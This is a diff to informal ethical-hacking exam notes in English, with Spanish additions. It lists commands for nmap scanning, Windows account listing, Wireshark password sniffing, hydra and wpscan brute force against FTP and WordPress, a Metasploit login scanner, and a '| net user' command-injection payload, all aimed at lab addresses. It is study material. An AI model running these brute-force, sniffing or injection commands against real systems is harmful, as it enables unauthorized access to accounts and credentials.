@@ -9,6 +9,11 @@ If even this the above command is not working then use this command-  namp -f 10
 6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
 7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
 8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
+comando nmap par ano confirmar que este en linea    nmap -Pn ip
+ver cuentas en windows       net user ( confirmar personas validas y qcuales no estan logueados)
+ 
+
+
 
 
 enumeration
@@ -35,7 +40,7 @@ Sniffing
 1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
 
 
-Hacking Web Servers
+Hacking Web Servers ( contaseñas usuarios por ftp. ssh)
 
 1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
 						    GET /HTTP/1.0
@@ -48,10 +53,11 @@ Then go to Desktop and in Ceh tools folder you will find wordlists, here you wil
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
+get nombre del archivo que quieres obtener para revisar
 
 
 
-Hacking Web Application
+Hacking Web Application  ( para buscar usuarios y contraseñas en paginas web)
 
 1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
 2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
@@ -63,6 +69,7 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 						 set RPORT 8080          (target port)
 						 set TARGETURI http://10.10.10.10:8080/
 						 set USERNAME admin
+						exploit
 4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
 			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
 5- Command Injection-  | net user  (Find users)
